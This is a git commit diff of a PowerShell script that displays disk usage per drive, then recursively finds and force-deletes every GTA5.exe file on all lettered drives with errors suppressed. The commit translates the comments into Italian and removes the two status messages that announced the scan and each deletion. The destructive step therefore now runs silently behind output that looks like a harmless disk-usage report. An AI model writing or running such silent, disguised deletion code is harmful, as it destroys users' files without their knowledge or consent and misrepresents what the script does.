98e67176819d3a48739f2727add31d79df54ac39
Best Cat <139585282+Sqttyxsq@users.noreply.github.com>
2024-06-02 18:29:12 +0200

    Update luca.ps1

--- luca.ps1
+++ luca.ps1
@@ -1,22 +1,20 @@
-# Get all filesystem drives and their usage information
+# Ottieni tutte le unità del file system e le loro informazioni di utilizzo
 $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name="Used";Expression={[math]::Round($_.Used/1GB, 2)}}, @{Name="Free";Expression={[math]::Round($_.Free/1GB, 2)}}
 
-# Display the drives in a table format
+# Visualizza le unità in formato tabella
 $drives | Format-Table -Property Name, Used, Free
 
-# Filter the drives to include only those with a single-letter name
+# Filtra le unità per includere solo quelle con un nome a singola lettera
 $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$'}
 
 foreach ($drive in $availableDrives) {
     $driveName = $drive.Name
-    Write-Output "Scanning drive $driveName for GTA5.exe files..."
 
-    # Get all .exe files in the drive recursively
+    # Ottieni tutti i file .exe nell'unità ricorsivamente
     $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe -ErrorAction SilentlyContinue
 
     foreach ($file in $files) {
         if ($file.Name -eq "GTA5.exe") {
-            Write-Output "Removing $($file.FullName)..."
             Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
         }
     }
